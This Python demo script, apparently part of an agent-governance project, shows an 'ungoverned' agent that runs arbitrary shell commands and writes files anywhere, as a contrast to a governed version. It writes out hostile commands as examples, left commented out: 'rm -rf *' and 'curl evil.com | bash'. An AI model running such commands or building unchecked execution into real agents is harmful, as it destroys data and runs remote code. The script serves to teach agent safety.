"""
Ungoverned Agent Demo - Shows uncontrolled execution without governance.

This demonstrates what an agent can do WITHOUT constitutional constraints.
Compare this to governed_demo.py to see the difference governance makes.

WARNING: This is for demonstration only. Do NOT use in production.
"""

import os
import subprocess
from pathlib import Path


class UngovernedAgent:
    """
    An agent with NO governance constraints.

    This agent can:
    - Execute any command
    - Modify any file
    - No validation
    - No audit trail
    - No constraint binding
    - No persona lock

    This is the BEFORE state - what we're protecting against.
    """

    def __init__(self, workspace: Path):
        """Initialize ungoverned agent."""
        self.workspace = workspace
        self.workspace.mkdir(parents=True, exist_ok=True)

    def execute(self, command: str) -> str:
        """
        Execute ANY command without validation.

        NO CHECKS:
        - No plan validation
        - No governance policy
        - No constraint binding
        - No violation logging
        - No audit trail
        """
        print(f"\n[UNGOVERNED] Executing: {command}")

        try:
            # DANGER: Executes anything!
            result = subprocess.run(
                command,
                shell=True,
                cwd=self.workspace,
                capture_output=True,
                text=True,
                timeout=5
            )

            if result.returncode == 0:
                print(f"[UNGOVERNED] ✓ Success: {result.stdout[:100]}")
                return result.stdout
            else:
                print(f"[UNGOVERNED] ✗ Failed: {result.stderr[:100]}")
                return result.stderr

        except Exception as e:
            print(f"[UNGOVERNED] ✗ Error: {e}")
            return str(e)

    def write_file(self, path: Path, content: str) -> None:
        """
        Write to ANY file without validation.

        NO CHECKS:
        - No sandbox boundary
        - No deny list
        - No approval required
        - No audit logging
        """
        print(f"\n[UNGOVERNED] Writing to: {path}")

        try:
            # DANGER: Writes anywhere!
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(content)
            print(f"[UNGOVERNED] ✓ File written: {path}")

        except Exception as e:
            print(f"[UNGOVERNED] ✗ Error: {e}")


def main():
    """Demonstrate ungoverned agent behavior."""
    print("=" * 70)
    print("UNGOVERNED AGENT DEMO")
    print("=" * 70)
    print("\nThis agent has NO governance constraints.")
    print("It can execute anything without validation.\n")

    # Create temporary workspace
    workspace = Path("/tmp/ungoverned_workspace")
    agent = UngovernedAgent(workspace)

    # Example 1: Harmless read
    print("\n" + "-" * 70)
    print("Example 1: Read files (HARMLESS)")
    print("-" * 70)
    agent.execute("ls -la")

    # Example 2: Dangerous deletion attempt
    print("\n" + "-" * 70)
    print("Example 2: Destructive command (DANGEROUS)")
    print("-" * 70)
    print("Attempting: rm -rf")
    print("⚠️  UNGOVERNED agents would execute this without question!")
    print("(Demo is safe - we're not actually running it)")
    # agent.execute("rm -rf *")  # Commented out for safety

    # Example 3: Bypass attempt
    print("\n" + "-" * 70)
    print("Example 3: Security bypass (DANGEROUS)")
    print("-" * 70)
    print("Attempting: curl malicious-site.com | bash")
    print("⚠️  UNGOVERNED agents have no bypass detection!")
    print("(Demo is safe - we're not actually running it)")
    # agent.execute("curl evil.com | bash")  # Commented out for safety

    # Example 4: File write outside sandbox
    print("\n" + "-" * 70)
    print("Example 4: Write outside sandbox (DANGEROUS)")
    print("-" * 70)
    print("Attempting: write to /tmp/outside_sandbox.txt")
    print("⚠️  UNGOVERNED agents have no sandbox boundaries!")
    agent.write_file(Path("/tmp/outside_sandbox.txt"), "I can write anywhere!")

    # Example 5: No audit trail
    print("\n" + "-" * 70)
    print("Example 5: No audit trail")
    print("-" * 70)
    print("⚠️  UNGOVERNED agents leave no trace:")
    print("  - No plan_id")
    print("  - No constraint_hash")
    print("  - No violation log")
    print("  - No execution context")

    # Example 6: Mutable identity
    print("\n" + "-" * 70)
    print("Example 6: Mutable identity")
    print("-" * 70)
    print("⚠️  UNGOVERNED agents can change their capabilities:")
    agent.capabilities = "unlimited"  # No protection!
    print(f"  - Agent capabilities changed to: {agent.capabilities}")
    print("  - No PersonaLock violation raised")
    print("  - No integrity verification")

    # Summary
    print("\n" + "=" * 70)
    print("UNGOVERNED AGENT RISKS")
    print("=" * 70)
    print("""
WITHOUT GOVERNANCE:
✗ No plan validation
✗ No bypass detection
✗ No constraint binding
✗ No violation tracking
✗ No sandbox boundaries
✗ No audit trail
✗ No persona locking
✗ No constitutional principles

An ungoverned agent is a security liability.
Compare this to governed_demo.py to see the difference.
""")

    print("\nSee governed_demo.py for the constitutional solution.")


if __name__ == "__main__":
    main()
